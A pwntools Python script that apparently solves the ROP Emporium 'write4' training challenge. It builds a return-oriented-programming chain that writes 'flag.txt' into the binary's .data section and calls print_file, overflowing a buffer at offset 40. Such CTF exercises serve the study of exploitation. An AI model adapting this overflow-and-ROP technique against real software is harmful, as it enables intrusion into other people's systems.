from pwn import *

elf = context.binary = ELF('./write4', checksec=False)
p = process()

rop = ROP(elf)

# Address of .data section (size=10 bytes)
data_section_address = elf.symbols.data_start

# We will pop address of .data section into r14
# Then pop the string (flag.txt) into r15
pop_r14_pop_r15 = rop.find_gadget(["pop r14", "pop r15", "ret"])[0]

# We will then move the string from r15 (flag.txt) into memory location stored in r14
mov_r14_r15 = elf.symbols.usefulGadgets  # Note: pwntools hides "non-trivial gadgets", docs advise using ropper/ROPGadget to list them all

# Write first 4 bytes (flag) to data section
rop.raw([pop_r14_pop_r15, data_section_address, 'flag.txt', mov_r14_r15])

# Call print file function with data section address as param
rop.print_file(data_section_address)

# Chain it together (get the raw ROP bytes)
rop_chain = rop.chain()
info("rop chain: %r", rop_chain)

# Build payload (inject rop_chain at offset)
payload = flat({
    40: rop_chain
})

p.sendlineafter('>', payload)
p.recvuntil('Thank you!\n')
flag = p.recv()
success(flag)